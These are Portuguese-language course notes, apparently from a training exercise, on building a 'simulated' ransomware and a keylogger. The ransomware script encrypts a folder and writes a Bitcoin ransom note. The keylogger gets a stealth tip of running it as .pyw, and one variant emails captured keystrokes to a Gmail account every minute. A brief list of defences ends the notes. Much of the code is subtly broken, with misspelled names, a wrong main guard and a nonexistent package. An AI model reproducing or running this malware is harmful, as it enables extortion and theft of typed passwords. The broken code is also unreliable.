<h1>Ransomware Simulado</h1>

Criar arquivos de teste, implementar um script que criptografa e descriptografa, além de gerar mensagem de “resgate"

- Criar uma pasta com o nome **test_files**
+ Dentro dele criar uma arquivo **senhas.txt**
*Com conteúdo: senha1: DIO_2025@hackers!@#



+ Criar um arquivo: **dados_confidenciais**
*Com conteúdo (apenas para simular um conteúdo qualquer):
sdçfkjasdçfkjaçskdlfjaçsdklfjçakdslfjçlkasjdfçlkajsfaçskldfjasçklfjklsjfkldsçjfkçlsfjasçfjçsdlfjaçslfjaçdsfklasçjfdçlkasdjfaçksldfjçklasjfdkl

Fora da pasta test_files criar um arquivo chamado **ransoware.py**

```python
from cryptography.fernet import Fernet
import os

#1. Gerar uma chave de criptografia e salvar
def gerar_chave():
	chave = Fernet.generate_key() 
	with open("chave.key", "wb") as chave_file:
		chave_file.write(chave)
		
#2. Carregar a chave salva
def carregar_chave():
	return open("chave.key", "rb").read()
	
#3. Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
	f=Fernet(chave)
	with open(arquivo, "rb") as file:
		dados = file.read
		dados_encriptados = f.encrypt(dados)
		with open(arquivo, "wb") as file:
			file.write(dados_encriptados)
			
#4. Encontrar aquivos para criptografar
def encontrar_arquivos(diretorio):
	lista = []
	for raiz, _, arquivos in os.walk(diretorio):
		for nome in arquivos:
			caminho = os.path.join(raiz, nome)
			if nome != "ransoware.py" and not nome.endswith(".key"):
				lista.append(caminho)
	return lista

#5. Mensagem de resgate
def criar_mensagem_resgate():
	with open("LEIA_ISSO.txt", "w") as f:
		f.write("Seus arquivos foram criptografados!\n")
		f.write("Envie 1 bitcoin para o endereço x e envie o comprovante!\n")
		f.write("Depois disso, enviaremos a chave para você recuperar seus dados\n")
		
#6. Execução principal do código
def main():
	gerar_chave()
	chave = carregar_chave()
	arquivos = encontrar_arquivos("teste_files")
	for arquivo in arquivos:
		criptografar_arquivo(arquivo, chave)
	criar_mensagem_resgate()
	print("Ransoware executado! Arquivos criptografados!")

if __name__ == "__main__ ":
	main()
```

Executar **python .\ransoware.py** 

Depois de executar o script os arquivos **dados_confidenciais** e **senhas.txt** estarão criptografados e será gerado um arquivo **chave.key**

<h2>Descriptografar</h2>

Criar **descriptografar.py**

```python 
from cryptography.fernet import Fernet
import os

def carregar_chave():
	return open("chave.key", "rb").read()

def descriptografar_arquivo(arquivo,chave):
	f = Fenet(chave)
	with open(arquivo, "rb") as file:
		dados = file.read()
		dados_descriptografos = f.decrypt(dados)
	with open(arquivo, "wb") as file:
		file.write(dados_descriptografados)

def encontrar_arquivos(diretorio):
	lista = []
	for raiz, _, arquivos in os.walk(diretorio):
		for nome in arquivos:
			caminho = os.path.join(raiz, nome)
			if nome != "ransoware.py" and not nome.endswith(".key"):
				lista.append(caminho)
	return lista

def main():
	chave = carregar_chave()
	arquivos = encontrar_arquivos("test_files")
	for arquivo in arquivos:
		descriptografar_arquivo(arquivo, chave)
	print("Arquivos restaurados com sucesso")

if __name__ == "__main__":
	main()
```

Executar **python .\descriptografar.py**

Então os arquivos serão descriptografados.

<h1>Keylogger</h2>

Criar uma nova pasta chamada **keylogger**

Instalar biblioteca pynput no console:
**pip install pynput**

<h3>Perguntas:</h3>
1 - Vai ficar em execução em segundo plano?
2 - Toda vez que o usuário digitar uma tecla, o programa vai capturar essa tecla.
3 - O que for digitado, será gravado em um arquivo .txt.
4 - O arquivo vai mostrar tudo o que foi digitado, de forma sequencial.

Criar novo arquivo: **keylogger.py**

```python

from pynput import keyboard

IGNORAR = {
    keyboard.Key.shift_l,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
}
#ao pressionar uma tecla
def on_press(key):
    try:
        # se for uma tecla "normal"(letra, número, símbolo)
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError: 
        with open("log.txt", "a", encoding=="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}]")
    with keyboard.Listener(on_press=opn_press) as listener:
        listener.join()


```     

<h1>Tornando o keylogger furtivo:</h1>

Para deixar o keylogger invisível, rodar o comando: **ren .\keylogger.py .\keylogger.pyw**

Assim não aparecerá o prompt de comandos enquanto ele coleta dados

<h1>Envio automático por e-mail</h1>
Criar uma conta gmail exclusiva para testes, pois o Google não aceita login direto por scripts

Acessar: https://mysaccount.google.com/apppasswords

Será gerada uma senha aleatória, e essa é a senha que será usada no script

Em seguida é necessário instalar a biblioteca secure-stmplit: 
**pip install secure-smtplit**

Criar arquivo: **keylogger_email.py**

```python
from pynput import keyboard
import smtplib 
from email.mime.text import MIMEText
from threading import Timer



#CONFIGURAÇÕES DE E-MAIL 
EMAIL_ORIGEM = "demokeylogger0@gmail.com"
EMAIL_DESTINO = "demokeylogger0@gmail.com"
SENHA_EMAIL = "ssdf dfdf fasdfasdf"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capaturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)
    
    log = ""

    # Agendar o envio a cada 60 segundos
    Timer(60, enviar_email).start()

def on_onpress(key):
    global log
    try:
        log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "/n"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        else:
            pass # Ignorar control, shift, etc...

#Inicia o keylogger e o envio automático

with keyboard.Listener(on_press=on) as listener:
    enviar_email()
    listener.join()

```

<h2>Como podemos nos proteger?</h2>
+Antivírus e firewalls atualizados;
+Monitoramento de comportamentos anormais.(detecção por comportamento)
+Conciência do usuário.
+Ambientes isolados para testes